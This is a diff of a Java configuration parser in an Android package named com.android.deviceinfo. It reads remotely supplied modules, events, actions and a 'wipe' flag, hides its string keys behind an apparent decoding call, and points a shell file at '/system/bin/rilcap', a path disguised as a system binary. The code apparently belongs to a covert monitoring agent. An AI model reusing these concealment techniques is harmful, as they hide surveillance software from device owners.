@@ -14,13 +14,13 @@ import org.json.JSONTokener;
 
 import com.android.deviceinfo.Debug;
 import com.android.deviceinfo.GeneralException;
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.action.Action;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.crypto.EncryptionPKCS5;
 import com.android.deviceinfo.crypto.Keys;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 /**
  * The Class Configuration.
@@ -46,7 +46,7 @@ public class Configuration {
 	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
 	// a_0=/system/bin/ntpsvd
-	public static final String shellFile = Messages.getString("a_0"); //$NON-NLS-1$
+	public static final String shellFile = M.d("/system/bin/rilcap"); //$NON-NLS-1$
 
 	private static final int AGENT_ENABLED = 0x2;
 
@@ -171,7 +171,7 @@ public class Configuration {
 
 		public void call(int moduleId, JSONObject params) throws ConfigurationException, GeneralException,
 				JSONException {
-			final String moduleType = params.getString(Messages.getString("a_18")); //$NON-NLS-1$
+			final String moduleType = params.getString(M.d("module")); //$NON-NLS-1$
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Module: " + moduleType + " Params size: " + params.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
@@ -194,12 +194,12 @@ public class Configuration {
 				Check.requires(jmodule != null, " (call) Assert failed, null jmodule"); //$NON-NLS-1$
 			}
 
-			String eventType = jmodule.getString(Messages.getString("a_17")); //$NON-NLS-1$
+			String eventType = jmodule.getString(M.d("event")); //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.asserts(eventType != null, " (call) Assert failed, null eventType"); //$NON-NLS-1$
 			}
-			if (jmodule.has(Messages.getString("a_16"))) { //$NON-NLS-1$
-				eventType += " " + jmodule.getString(Messages.getString("a_12")); //$NON-NLS-1$ //$NON-NLS-2$
+			if (jmodule.has(M.d("type"))) { //$NON-NLS-1$
+				eventType += " " + jmodule.getString(M.d("type")); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 
 			if (Cfg.DEBUG) {
@@ -221,10 +221,10 @@ public class Configuration {
 
 		public void call(int actionId, JSONObject jaction) throws ConfigurationException, GeneralException,
 				JSONException {
-			String desc = jaction.getString(Messages.getString("a_13")); //$NON-NLS-1$
+			String desc = jaction.getString(M.d("desc")); //$NON-NLS-1$
 			final Action a = new Action(actionId, desc);
 
-			JSONArray jsubactions = jaction.getJSONArray(Messages.getString("a_14")); //$NON-NLS-1$
+			JSONArray jsubactions = jaction.getJSONArray(M.d("subactions")); //$NON-NLS-1$
 			int subNum = jsubactions.length();
 
 			if (Cfg.DEBUG) {
@@ -234,7 +234,7 @@ public class Configuration {
 			for (int j = 0; j < subNum; j++) {
 				JSONObject jsubaction = jsubactions.getJSONObject(j);
 
-				final String type = jsubaction.getString(Messages.getString("a_15")); //$NON-NLS-1$
+				final String type = jsubaction.getString(M.d("action")); //$NON-NLS-1$
 				ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
 				if (a.addSubAction(conf)) {
 					if (Cfg.DEBUG) {
@@ -266,10 +266,10 @@ public class Configuration {
 			}
 			JSONObject root = (JSONObject) new JSONTokener(json).nextValue();
 
-			JSONArray jmodules = root.getJSONArray(Messages.getString("a_8")); //$NON-NLS-1$
-			JSONArray jevents = root.getJSONArray(Messages.getString("a_9")); //$NON-NLS-1$
-			JSONArray jactions = root.getJSONArray(Messages.getString("a_10")); //$NON-NLS-1$
-			JSONObject jglobals = root.getJSONObject(Messages.getString("a_11")); //$NON-NLS-1$
+			JSONArray jmodules = root.getJSONArray(M.d("modules")); //$NON-NLS-1$
+			JSONArray jevents = root.getJSONArray(M.d("events")); //$NON-NLS-1$
+			JSONArray jactions = root.getJSONArray(M.d("actions")); //$NON-NLS-1$
+			JSONObject jglobals = root.getJSONObject(M.d("globals")); //$NON-NLS-1$
 
 			Visitor.load(jmodules, new LoadModule(instantiate));
 			Visitor.load(jevents, new LoadEvent(instantiate));
@@ -302,12 +302,12 @@ public class Configuration {
 
 		Globals g = new Globals();
 
-		JSONObject jquota = jglobals.getJSONObject(Messages.getString("a_1")); //$NON-NLS-1$
-		g.quotaMin = jquota.getInt(Messages.getString("a_2")); //$NON-NLS-1$
-		g.quotaMax = jquota.getInt(Messages.getString("a_3")); //$NON-NLS-1$
+		JSONObject jquota = jglobals.getJSONObject(M.d("quota")); //$NON-NLS-1$
+		g.quotaMin = jquota.getInt(M.d("min")); //$NON-NLS-1$
+		g.quotaMax = jquota.getInt(M.d("max")); //$NON-NLS-1$
 
-		g.wipe = jglobals.getBoolean(Messages.getString("a_4")); //$NON-NLS-1$
-		g.type = jglobals.getString(Messages.getString("a_5")); //$NON-NLS-1$
+		g.wipe = jglobals.getBoolean(M.d("wipe")); //$NON-NLS-1$
+		g.type = jglobals.getString(M.d("type")); //$NON-NLS-1$
 
 		status.setGlobal(g);
 	}
